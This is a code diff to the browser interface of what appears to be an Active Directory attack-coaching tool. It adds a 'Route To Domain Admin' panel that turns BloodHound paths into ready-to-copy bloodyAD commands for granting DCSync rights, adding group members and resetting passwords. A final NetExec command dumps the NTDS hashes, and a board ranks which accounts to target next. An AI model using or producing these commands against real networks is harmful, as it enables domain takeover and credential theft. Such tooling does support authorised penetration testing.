@@ -47,6 +47,92 @@
     } catch (e) { return { dc: params.target || null, host: params.target || null, lhost: params.lhost || null, secret: null }; }
   }
 
+  function shortName(s) { return String(s == null ? '' : s).split('@')[0]; }
+
+  // The coach's top queued move + how many it ranks right now, so the Domain tab can say "this data
+  // became your next moves, here they are in Next Steps". General: any ingest re-ranks the coach.
+  function coachQueued() {
+    try {
+      var ranked = OBOL.pack.rankActions(OBOL.store.factSet(), OBOL.packs.actions(), {});
+      return { top: ranked[0] || null, count: ranked.length };
+    } catch (e) { return { top: null, count: 0 }; }
+  }
+
+  // A bloodyAD one-liner for walking one hop of the owned->DA path. General per (edge, target kind):
+  // control of the DOMAIN -> grant yourself DCSync; a group -> add yourself as a member; a user ->
+  // reset or shadow it. bloodyAD is obol's house ACL-abuse tool, so the whole chain reads consistently.
+  function bdPrefix(ctx, domain, you) {
+    var auth = ctx.pw ? ("-p '" + ctx.pw + "'") : (ctx.nt ? ("-p ':" + ctx.nt + "'") : "-p '<password>'");
+    return "bloodyAD -u '" + (you || '<you>') + "' " + auth + " -d " + (domain || '<domain>') + " --host " + (ctx.dc || '<dc-ip>');
+  }
+  function hopCommand(hop, ctx, domain, you) {
+    var pre = bdPrefix(ctx, domain, you), tgt = shortName(hop.to), edge = String(hop.edge || ''), kind = String(hop.to_kind || '').toLowerCase();
+    if (/memberof/i.test(edge)) return '';   // membership is not an action you take, it is inherited
+    if (/domain/.test(kind) && /genericall|writedacl|owns|writeowner|allextendedrights/i.test(edge)) return pre + " add dcsync '" + (you || '<you>') + "'";
+    if (/group/.test(kind) || /addmember|addself/i.test(edge)) return pre + " add groupMember '" + tgt + "' '" + (you || '<you>') + "'";
+    if (/forcechangepassword/i.test(edge)) return pre + " set password '" + tgt + "' 'Newp@ss123'";
+    if (/genericall|genericwrite|writedacl|owns|writeowner|allextendedrights/i.test(edge)) return pre + " add genericAll '" + tgt + "' '" + (you || '<you>') + "'";
+    return pre + "  # abuse " + edge + " on " + tgt;
+  }
+
+  // The "route to Domain Admin" block: the derived shortest owned->DA path as NUMBERED steps, each with
+  // the exact bloodyAD command for its edge, ending in the DCSync cash-in, plus a bridge to Next Steps.
+  // Reuses view.analysis (already computed) so it is general to any collection, not this box.
+  function routeStepsHtml(view, owned, summary, ctx) {
+    var an = (view && view.analysis) || {};
+    if (!an.headline) return '';
+    var you = shortName((owned && owned[0]) || '') || '<you>';
+    var domain = (summary && summary.domain) || '';
+    var out = '<h2 class="coach-sec-h">Route To Domain Admin</h2><div class="bh-route"><p class="bh-route-head">' + esc(an.headline) + '</p>';
+    if (an.paths && an.paths.length) {
+      var hops = an.paths[0].hops || [], step = 0;
+      var chain = '<div class="bh-route-chain"><span class="bh-rn owned">' + esc(you) + '</span>';
+      hops.forEach(function (h) { chain += '<span class="bh-re">' + esc(h.edge) + '</span><span class="bh-rn' + (/domain/.test(String(h.to_kind || '').toLowerCase()) ? ' goal' : '') + '">' + esc(shortName(h.to)) + '</span>'; });
+      out += chain + '</div><ol class="bh-steps">';
+      hops.forEach(function (h) {
+        var cmd = hopCommand(h, ctx, domain, you);
+        if (!cmd) return;   // skip pure MemberOf hops (no action)
+        step++;
+        out += '<li><div class="bh-step-what">' + esc(h.edge) + ' on <b>' + esc(shortName(h.to)) + '</b></div>'
+          + '<div class="bh-cmd"><code>' + esc(cmd) + '</code><button class="btn-copy" data-copy="' + U.attr(cmd) + '">Copy</button></div></li>';
+      });
+      // the cash-in: once you hold DCSync, dump the Administrator hash
+      var sec = ctx.secret || "-p '<password>'";
+      var dump = 'nxc smb ' + (ctx.dc || '<dc-ip>') + " -u '" + you + "' " + sec + ' --ntds';
+      out += '<li><div class="bh-step-what">DCSync: dump the Administrator hash</div>'
+        + '<div class="bh-cmd"><code>' + esc(dump) + '</code><button class="btn-copy" data-copy="' + U.attr(dump) + '">Copy</button></div></li></ol>';
+    }
+    out += '</div>';
+    return out;
+  }
+
+  // Explore ANY principal: its shortest path(s) to Domain Admin, and what it controls (forward
+  // reachability). Lets a user theorize "if I owned X, what opens up" for any account in the data.
+  function exploreHtml(principal, summary) {
+    if (!principal || !summary) return '';
+    var paths = OBOL.bloodhound.ownedPaths(summary, [principal]) || { paths: [] };
+    var ctl = OBOL.bloodhound.controls(summary, principal) || { controls: [], groups: [], count: 0 };
+    var out = '<div class="bh-explore-card"><h3>' + esc(shortName(principal)) + '</h3>';
+    if (paths.paths && paths.paths.length) {
+      var hops = paths.paths[0];
+      var chain = '<span class="bh-rn owned">' + esc(shortName(principal)) + '</span>';
+      hops.forEach(function (h) { chain += '<span class="bh-re">' + esc(h.edge) + '</span><span class="bh-rn' + (/domain/.test(String(h.to_kind || '').toLowerCase()) ? ' goal' : '') + '">' + esc(shortName(h.to)) + '</span>'; });
+      out += '<p class="bh-x-line"><b>' + paths.paths.length + '</b> path(s) to Domain Admin, shortest ' + hops.length + ' hop(s):</p><div class="bh-route-chain">' + chain + '</div>';
+    } else {
+      out += '<p class="bh-x-line bh-x-none">No path to Domain Admin derived from this account.</p>';
+    }
+    if (ctl.count) {
+      var show = ctl.controls.slice(0, 15);
+      out += '<p class="bh-x-line">Controls <b>' + ctl.count + '</b> object(s)' + (ctl.groups.length ? ', member of ' + ctl.groups.length + ' group(s)' : '') + ':</p>'
+        + '<ul class="bh-princ">' + show.map(function (x) {
+            return '<li><span class="bh-re">' + esc(x.edge) + '</span> <button class="bh-princ-x" data-explore="' + U.attr(x.name) + '">' + esc(shortName(x.name)) + '</button> <span class="bh-x-kind">' + esc(x.type) + '</span></li>';
+          }).join('') + '</ul>' + (ctl.count > show.length ? '<p class="route-sub">+ ' + (ctl.count - show.length) + ' more controlled object(s).</p>' : '');
+    } else {
+      out += '<p class="bh-x-line bh-x-none">Controls nothing abusable in this collection.</p>';
+    }
+    return out + '</div>';
+  }
+
   function render() {
     var eng = OBOL.store.active();
     var summary = eng && eng.bloodhound;
@@ -66,37 +152,75 @@
         + '<button id="bh-recompute" class="btn-ghost">Recompute Paths</button>'
         + '<button id="bh-report" class="btn-primary">Open Report</button></div></div>';
 
+      // Bridge: this data became the coach's next moves. Tells the user where the "do this" lives.
+      var q = coachQueued();
+      if (q.top) {
+        html += '<a class="bh-bridge" href="#/path"><span class="bh-bridge-k">obol turned this graph into your next moves.</span> '
+          + '<span class="bh-bridge-top">Next up: ' + esc(q.top.title) + '</span>'
+          + '<span class="bh-bridge-go">Open Next Steps →</span></a>';
+      }
+
+      // Route to Domain Admin: the derived owned->DA path as numbered steps with the command per hop.
+      html += routeStepsHtml(view, owned, summary, cmdCtx(owned, true));
+
       // Interactive attack-path graph (parity with obol-local's draggable domain graph).
       html += '<h2 class="coach-sec-h">Attack-path graph</h2>'
         + '<div id="bh-graph" class="bh-graph-host">'
         + (owned.length ? '' : '<div class="coach-empty">Enter an owned principal above to derive and graph owned→Domain-Admin paths.</div>')
         + '</div>';
 
-      // PlumHound-style query board: one card per high-value query with matched principals + the
-      // exact commands obol would run against it.
-      html += '<h2 class="coach-sec-h">High-value queries (PlumHound-style)</h2><div class="bh-census">';
-      (view.sections || []).forEach(function (s) {
+      // Targeting board: who is closest to Domain Admin. Click a row to explore that account's paths.
+      var near = (OBOL.bloodhound.nearestToGoal(summary) || []).filter(function (r) { return /user|group|computer/.test(r.type); });
+      if (near.length) {
+        html += '<h2 class="coach-sec-h">Closest To Domain Admin</h2>'
+          + '<p class="route-sub">Fewest hops to Domain Admin, who to go after next. Click a row to see that account’s paths and what it controls.</p>'
+          + '<div class="bh-board">'
+          + near.slice(0, 12).map(function (r) {
+              return '<button class="bh-brow" data-explore="' + U.attr(r.name) + '"><span class="bh-bhops">' + r.hops + ' hop' + (r.hops === 1 ? '' : 's') + '</span>'
+                + '<span class="bh-btype">' + esc(r.type) + '</span><span class="bh-bname">' + esc(shortName(r.name)) + '</span></button>';
+            }).join('')
+          + '</div>' + (near.length > 12 ? '<p class="route-sub">+ ' + (near.length - 12) + ' more.</p>' : '');
+      }
+
+      // Explore any account: paths to DA + what it controls, for ANY principal (theorize, not just owned).
+      html += '<h2 class="coach-sec-h">Explore An Account</h2>'
+        + '<div class="ev-row"><input id="bh-explore" class="ev-cmd" placeholder="any principal, e.g. SVC-ALFRESCO@' + esc((summary.domain || 'DOMAIN')) + '">'
+        + '<button id="bh-explore-go" class="btn-ghost">Show Paths + Control</button></div>'
+        + '<div id="bh-explore-slot"></div>';
+
+      // High-value queries: matched cards first, the empty ones collapsed so the signal is up top.
+      var ownedUpper = {}; owned.forEach(function (o) { ownedUpper[shortName(o).toUpperCase()] = 1; });
+      function cardHtml(s) {
         var items = s.items || s.principals || [];
         var n = items.length || s.count || 0;
         var cls = /admin|dcsync|unconstrained|domain admin|enterprise/i.test(s.title) ? 'crit' : (/kerberoast|as-?rep|roast/i.test(s.title) ? 'warn' : '');
+        var free = /as-?rep|password not required/i.test(s.title);
         var cmds = (s.commands || []).slice(0, 3).map(function (c) {
           var line = typeof c === 'string' ? c : (c.run || c.cmd || c.command || '');
-          return line ? '<div class="bh-cmd"><code>' + esc(line) + '</code><button class="btn-copy" data-copy="' + U.attr(line) + '">copy</button></div>' : '';
+          return line ? '<div class="bh-cmd"><code>' + esc(line) + '</code><button class="btn-copy" data-copy="' + U.attr(line) + '">Copy</button></div>' : '';
         }).join('');
-        // Expandable detail: the matched accounts/hosts behind the count (e.g. the five DCSync principals).
         var detail = items.length
           ? '<details class="bh-detail"><summary>' + items.length + ' ' + (items.length === 1 ? 'match' : 'matches') + '</summary>'
-            + '<ul class="bh-princ">' + items.map(function (p) { return '<li>' + esc(p) + '</li>'; }).join('') + '</ul></details>'
+            + '<ul class="bh-princ">' + items.map(function (p) {
+                var owns = ownedUpper[shortName(p).toUpperCase()];
+                return '<li><button class="bh-princ-x" data-explore="' + U.attr(p) + '">' + esc(p) + '</button>'
+                  + (owns ? ' <span class="bh-tag own">owned</span>' : '') + '</li>';
+              }).join('') + '</ul></details>'
           : '';
-        html += '<div class="bh-card"><h3>' + esc(s.title) + '</h3>'
+        return '<div class="bh-card"><h3>' + esc(s.title) + (free ? ' <span class="bh-tag free">costs nothing</span>' : '') + '</h3>'
           + '<div class="bh-count ' + cls + '">' + n + '</div>'
           + (s.hint ? '<div class="bh-hint">' + esc(s.hint) + '</div>' : '')
           + (s.cash ? '<div class="bh-cash">' + esc(s.cash) + '</div>' : '')
-          + detail
-          + (cmds ? '<div class="bh-cmds">' + cmds + '</div>' : '')
-          + '</div>';
-      });
-      html += '</div>';
+          + detail + (cmds ? '<div class="bh-cmds">' + cmds + '</div>' : '') + '</div>';
+      }
+      var secs = view.sections || [];
+      var matched = secs.filter(function (s) { return (s.items || s.principals || []).length || s.count; });
+      var empty = secs.filter(function (s) { return !((s.items || s.principals || []).length || s.count); });
+      html += '<h2 class="coach-sec-h">High-Value Queries</h2><div class="bh-census">' + matched.map(cardHtml).join('') + '</div>';
+      if (empty.length) {
+        html += '<details class="bh-empties"><summary>Show ' + empty.length + ' queries with no matches</summary>'
+          + '<div class="bh-census">' + empty.map(cardHtml).join('') + '</div></details>';
+      }
       html += '<div id="bh-report-slot"></div>';
     }
     html += '</section>';
@@ -137,6 +261,7 @@
   }
 
   function mounted(ctx) {
+    var mount = (ctx && ctx.mount) || document;   // was referenced below but never defined: copy/report wiring silently threw
     var drop = document.getElementById('bh-drop');
     var input = document.getElementById('bh-file');
     if (drop && input) {
@@ -168,6 +293,19 @@
     U.on(mount, 'click', '.btn-copy', function (e, b) {
       var v = b.getAttribute('data-copy'); if (v) U.copy(v).then(function (ok) { U.toast(ok ? 'Copied' : 'Copy failed', ok ? '' : 'err'); });
     });
+
+    // Explore any account: a targeting-board row, a census principal, or the input, all compute that
+    // principal's paths to DA + what it controls. Theorize from any account, not just the creds you hold.
+    function doExplore(principal) {
+      var eng = OBOL.store.active(), slot = document.getElementById('bh-explore-slot');
+      if (!eng || !eng.bloodhound || !slot || !principal) return;
+      var inp = document.getElementById('bh-explore'); if (inp) inp.value = principal;
+      slot.innerHTML = exploreHtml(principal, eng.bloodhound);
+      try { slot.scrollIntoView({ block: 'nearest' }); } catch (x) {}
+    }
+    U.on(mount, 'click', '[data-explore]', function (e, t) { e.preventDefault(); doExplore(t.getAttribute('data-explore')); });
+    var xgo = document.getElementById('bh-explore-go');
+    if (xgo) xgo.addEventListener('click', function () { var v = ((document.getElementById('bh-explore') || {}).value || '').trim(); if (v) doExplore(v); });
 
     var rep = document.getElementById('bh-report');
     if (rep) rep.addEventListener('click', function () {
